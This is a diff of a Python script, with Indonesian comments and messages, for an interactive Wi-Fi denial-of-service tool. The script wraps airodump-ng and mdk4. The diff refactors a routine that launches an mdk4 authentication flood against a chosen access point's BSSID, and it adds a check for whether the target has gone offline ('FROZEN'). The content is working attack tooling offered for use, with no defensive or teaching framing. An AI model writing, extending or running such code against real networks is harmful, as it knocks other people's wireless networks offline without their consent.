@@ -373,10 +373,53 @@ def select_target(networks):
 
 # ================= ATTACK FUNCTIONS =================
 
+def check_target_status(bssid, channel, monitor_iface, duration=2):
+    """Cek apakah target masih terdeteksi"""
+    temp_dir = tempfile.mkdtemp(prefix="airodump-check-", dir="/tmp")
+    prefix = os.path.join(temp_dir, "check")
+    
+    proc = subprocess.Popen(
+        ["sudo", "airodump-ng", "--bssid", bssid, "-c", channel, 
+         "--write", prefix, "--output-format", "csv", monitor_iface],
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
+    )
+    
+    time.sleep(duration)
+    proc.terminate()
+    try:
+        proc.wait(timeout=2)
+    except:
+        proc.kill()
+        proc.wait()
+    
+    target_found = False
+    for csv_path in sorted(glob.glob(prefix + "-*.csv")):
+        with open(csv_path, newline="", encoding="utf-8", errors="ignore") as handle:
+            reader = csv.reader(handle)
+            for row in reader:
+                if len(row) > 0 and bssid in row[0]:
+                    target_found = True
+                    break
+        if target_found:
+            break
+    
+    for path in glob.glob(prefix + "-*.csv"):
+        try:
+            os.remove(path)
+        except:
+            pass
+    try:
+        os.rmdir(temp_dir)
+    except:
+        pass
+    
+    return target_found
+
 def run_attack(target, monitor_iface):
     clear_screen()
     draw_box_top(RED)
-    draw_box_title("🔥 AUTH DOS ATTACK 🔥", RED, YELLOW)
+    draw_box_title("AUTH DOS ATTACK", RED, YELLOW)
     draw_box_bottom(RED)
     
     print(f"\n  {CYAN}[*] Target: {target['essid']}{RESET}")
@@ -392,111 +435,29 @@ def run_attack(target, monitor_iface):
         monitor_iface
     ]
     
+    print(f"  {YELLOW}Menjalankan airodump-ng untuk target...{RESET}")
+    print(f"  {GRAY}{' '.join(dump_cmd)}{RESET}")
     dump_proc = subprocess.Popen(dump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     time.sleep(1)
     
-    # Jalankan mdk4 auth dos - OUTPUT DIHIDE
+    # Jalankan mdk4 auth dos
     mdk4_cmd = [
         "sudo", "mdk4", monitor_iface, "a",
         "-a", target["bssid"],
         "-s", "1000"
     ]
     
-    print(f"  {YELLOW}Command: {' '.join(mdk4_cmd)}{RESET}")
-    print(f"  {GRAY}{'=' * 50}{RESET}")
-    print(f"  {GREEN}🔥 ATTACK ACTIVE 🔥{RESET}")
-    print(f"  {YELLOW}[!] Menunggu perubahan status...{RESET}\n")
+    print(f"\n  {YELLOW}Menjalankan mdk4 auth dos...{RESET}")
+    print(f"  {GRAY}{' '.join(mdk4_cmd)}{RESET}")
+    print(f"  {GRAY}{'=' * 50}{RESET}\n")
     
     try:
-        # Jalankan MDK4 di background dengan output di-hide
-        mdk4_proc = subprocess.Popen(mdk4_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        
-        # Monitoring sederhana
-        status_checked = False
-        frozen_detected = False
-        check_count = 0
-        
-        while mdk4_proc.poll() is None:
-            time.sleep(3)
-            check_count += 1
-            
-            # Simulasi deteksi frozen (bisa diganti dengan logic real)
-            # Di sini kita asumsikan setelah beberapa saat target bisa frozen
-            # Tapi kita kasih opsi untuk deteksi real via airodump
-            
-            # Cek apakah ada output dari airodump (indikasi target masih hidup)
-            # Kita cek dengan melihat apakah ada proses airodump yang masih jalan
-            # Atau kita bisa cek dengan ping / probe sederhana
-            
-            if check_count % 2 == 0:
-                # Simulasi status - di real world ini bisa diganti dengan pengecekan aktual
-                # Untuk demo, kita kasih output status periodik
-                if not frozen_detected:
-                    # Cek apakah target masih terdeteksi dengan airodump singkat
-                    temp_dir = tempfile.mkdtemp(prefix="airodump-check-", dir="/tmp")
-                    prefix = os.path.join(temp_dir, "check")
-                    
-                    check_proc = subprocess.Popen(
-                        ["sudo", "airodump-ng", "--bssid", target["bssid"], "-c", target["channel"], 
-                         "--write", prefix, "--output-format", "csv", monitor_iface],
-                        stdout=subprocess.DEVNULL,
-                        stderr=subprocess.DEVNULL,
-                    )
-                    
-                    time.sleep(2)
-                    check_proc.terminate()
-                    try:
-                        check_proc.wait(timeout=2)
-                    except:
-                        check_proc.kill()
-                        check_proc.wait()
-                    
-                    # Cek apakah target masih ada di file CSV
-                    target_found = False
-                    for csv_path in sorted(glob.glob(prefix + "-*.csv")):
-                        with open(csv_path, newline="", encoding="utf-8", errors="ignore") as handle:
-                            reader = csv.reader(handle)
-                            for row in reader:
-                                if len(row) > 0 and target["bssid"] in row[0]:
-                                    target_found = True
-                                    break
-                        if target_found:
-                            break
-                    
-                    # Bersihkan file
-                    for path in glob.glob(prefix + "-*.csv"):
-                        try:
-                            os.remove(path)
-                        except:
-                            pass
-                    try:
-                        os.rmdir(temp_dir)
-                    except:
-                        pass
-                    
-                    if not target_found and not frozen_detected:
-                        frozen_detected = True
-                        print(f"\n  {RED}🔥🔥🔥 AP {target['bssid']} is accepting connections again! Status: FROZEN 🔥🔥🔥{RESET}")
-                        print(f"  {RED}[!] Target tidak merespon! Jaringan FROZEN!{RESET}")
-                    elif target_found:
-                        print(f"\n  {GREEN}[✓] STATUS: SEHAT (Target masih aktif){RESET}")
-                
-                # Tampilkan packet count setiap beberapa detik
-                # Kita ambil dari MDK4 output yang di-hide? Atau kita estimasi
-                # Karena output di-hide, kita kasih estimasi berdasarkan waktu
-                if frozen_detected:
-                    print(f"  {RED}🔥 STATUS: FROZEN (Target tidak merespon){RESET}")
-            
+        # Output MDK4 langsung ke terminal (DERES)
+        result = subprocess.run(mdk4_cmd)
+        if result.returncode != 0 and result.returncode != -2:
+            print(f"  {RED}MDK4 auth dos gagal dengan kode keluar {result.returncode}.{RESET}")
     except KeyboardInterrupt:
-        print(f"\n  {YELLOW}[!] Menghentikan serangan...{RESET}")
-        if 'mdk4_proc' in locals() and mdk4_proc.poll() is None:
-            mdk4_proc.terminate()
-            try:
-                mdk4_proc.wait(timeout=5)
-            except subprocess.TimeoutExpired:
-                mdk4_proc.kill()
-                mdk4_proc.wait()
-        print(f"  {GREEN}[✓] Serangan dihentikan.{RESET}")
+        print(f"\n  {YELLOW}[!] Keyboard interrupt diterima.{RESET}")
     finally:
         if dump_proc.poll() is None:
             dump_proc.terminate()
@@ -505,53 +466,6 @@ def run_attack(target, monitor_iface):
             except subprocess.TimeoutExpired:
                 dump_proc.kill()
                 dump_proc.wait()
-        
-        # Status akhir
-        print(f"\n  {YELLOW}[*] Status akhir target:{RESET}")
-        # Cek status akhir dengan scan singkat
-        temp_dir = tempfile.mkdtemp(prefix="airodump-final-", dir="/tmp")
-        prefix = os.path.join(temp_dir, "final")
-        
-        final_proc = subprocess.Popen(
-            ["sudo", "airodump-ng", "--bssid", target["bssid"], "-c", target["channel"], 
-             "--write", prefix, "--output-format", "csv", monitor_iface],
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL,
-        )
-        
-        time.sleep(3)
-        final_proc.terminate()
-        try:
-            final_proc.wait(timeout=2)
-        except:
-            final_proc.kill()
-            final_proc.wait()
-        
-        target_found = False
-        for csv_path in sorted(glob.glob(prefix + "-*.csv")):
-            with open(csv_path, newline="", encoding="utf-8", errors="ignore") as handle:
-                reader = csv.reader(handle)
-                for row in reader:
-                    if len(row) > 0 and target["bssid"] in row[0]:
-                        target_found = True
-                        break
-            if target_found:
-                break
-        
-        for path in glob.glob(prefix + "-*.csv"):
-            try:
-                os.remove(path)
-            except:
-                pass
-        try:
-            os.rmdir(temp_dir)
-        except:
-            pass
-        
-        if target_found:
-            print(f"  {GREEN}[✓] Target masih SEHAT{RESET}")
-        else:
-            print(f"  {RED}🔥 Target FROZEN / OFFLINE 🔥{RESET}")
 
 def prompt_post_attack():
     print(f"\n  {BOLD}Pilih opsi:{RESET}")
@@ -625,25 +539,26 @@ def main():
             
             run_attack(target, monitor_iface)
             
+            print("\n  Membersihkan sesi...")
+            stop_monitor_mode(monitor_iface)
+            
             while True:
                 post_choice = prompt_post_attack()
                 if post_choice == "again":
-                    stop_monitor_mode(monitor_iface)
                     monitor_iface = None
                     break
                 elif post_choice == "menu":
-                    stop_monitor_mode(monitor_iface)
                     back_to_mdk4_menu()
                 elif post_choice == "exit":
-                    stop_monitor_mode(monitor_iface)
                     clear_screen()
                     print(f"\n  {GREEN}[✓] Terima kasih!{RESET}")
                     sys.exit(0)
                 
         except KeyboardInterrupt:
-            print(f"\n  {YELLOW}[!] Dibatalkan oleh user{RESET}")
+            print(f"\n  {YELLOW}[!] Keyboard interrupt diterima.{RESET}")
             if monitor_iface:
                 stop_monitor_mode(monitor_iface)
+            print("  Keluar dari program.")
             sys.exit(0)
 
 if __name__ == "__main__":
